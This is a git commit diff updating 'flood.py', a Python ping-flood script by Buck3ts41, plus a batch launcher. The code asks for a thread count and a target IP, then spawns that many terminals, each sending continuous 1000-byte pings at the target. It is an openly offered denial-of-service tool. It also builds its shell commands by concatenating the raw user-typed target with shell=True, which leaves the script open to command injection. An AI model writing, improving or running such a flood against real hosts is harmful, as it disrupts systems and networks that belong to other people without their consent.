74d2dcd41969b544e9e25f720bce3dc9b1897dd2
Buck3ts41 <107511158+Buck3ts41@users.noreply.github.com>
2023-03-05 12:51:30 +0100

    Add files via upload

--- flood.py
+++ flood.py
@@ -7,82 +7,82 @@ Hope you enjoy :)
 '''
 
 ###import###
-
 import os
 import time
 import sys
 import platform
-
+import subprocess
 
 ###system-check###
 
 try:
 	from art import *
-	import colorama
 	from colorama import Fore
 except ImportError:
-	print('[-] Failed to import an external module.')
-      
-	
+	print(Fore.RED + '[-] Failed to import an external module.')
 	if platform.system() == 'Linux':
-		print('    trying to install missing dependencies...')
-		os.system("pip install -r requirements.txt")
-		print("done, restart the script")
-		time.sleep(1)
+		print(Fore.YELLOW + '  [*] Trying to install missing dependencies...')
+		os.system("pip3 install -r requirements.txt")
+		print(Fore.YELLOW + " [!] Done, restart the script")
+		time.sleep(1.5)
 	elif platform.system() == 'Windows':
-		print('    trying to install missing dependencies...')
+		print(Fore.YELLOW + '   [*] Trying to install missing dependencies...')
 		os.system("python -m pip install -r requirements.txt")
-		print("done, restart the script")
-		time.sleep(1)
-	
+		print(Fore.YELLOW + " [!] Done, restart the script")
+		time.sleep(1.5)
 	sys.exit(1)
-		
-time.sleep(3)
+
+def vrb():
+	global pwr
+	global target
+	pwr = int(input("Thread: "))
+	target = input("Target ip: ")  # edit this line with you current target
+
 def clear():
 	if platform.system() == 'Linux':
 		os.system("clear")
 	if platform.system() == 'Windows':
 		os.system("cls")
-clear()
 
-tprint("Ping - Flooder")
-print("Script by Buck3ts41", '\n')
-print("V 1.5")
-if platform.system()== 'Linux':
-	print("Ping Flooder running on linux", '\n')
-if platform.system()== 'Windows':
-	print("Ping Flooder running on Windows")
-	print("Windows is now full supported", '\n')
-power = "Power (1-50): "
-target = input(Fore.YELLOW + "Current target: yourtarget") #edit this line with you current target
-time.sleep(2)
-
-###fun###
+def banner():
+	clear()
+	tprint("Ping - Flooder")
+	print("Script by Buck3ts41", '\n')
+	print("V 2.0")
+	if platform.system()== 'Linux':
+		print(Fore.BLUE + " [+] Ping Flooder running on linux", '\n')
+	if platform.system()== 'Windows':
+		print(Fore.BLUE + " [+] Ping Flooder running on Windows", '\n')
+		#print("Windows is now full supported", '\n')
+	print(Fore.GREEN + " [!] Thread --> ", pwr)
+	print(Fore.GREEN + " [!] Target --> ", target)
+	time.sleep(2)
 
 def start():
+
 	if platform.system()== 'Linux':
-		
-		for k in range(x):
-			os.system("lxterminal -e ping yourtarget -i 0.2 -s 1000") #edit this line for changing target
+		for k in range(pwr):
+			host = subprocess.Popen('lxterminal -e ping ' + str(target) + ' -i 0.2 -s 1000', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+
 	if platform.system()== 'Windows':
-		for k in range(x):
-			
-			os.system("start C:\Windows\System32\cmd.exe /k ping -t -l 1000 yourtarget") #edit this line for changing target
-			
-	for k in range(1000000000):
-		print(Fore.GREEN + "[*] Sending 1000 bytes packets...", '\n')
-		time.sleep(1)
-		
+		for k in range(pwr):
+			subprocess.Popen('start cmd /k ping -t -l 1000 ' + str(target), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+
+	clear()
+	print(Fore.CYAN + " [!] Started")
+	time.sleep(5)
+
 
 ###main###
 
-x = int(input(power))
-
-if x>20:
-	warning = input(Fore.RED + "High power can effect pc performance, continue?: ")
+vrb()
+if pwr>20:
+	warning = input(Fore.RED + " [-] High power can effect pc performance, continue?: ")
 	if warning=='y':
+		banner()
 		start()
 	if warning=='n':
 		sys.exit(1)
-if x<20:
+if pwr<20:
+	banner()
 	start()
---
+++ start-win.bat
@@ -0,0 +1,1 @@
+python flood.py
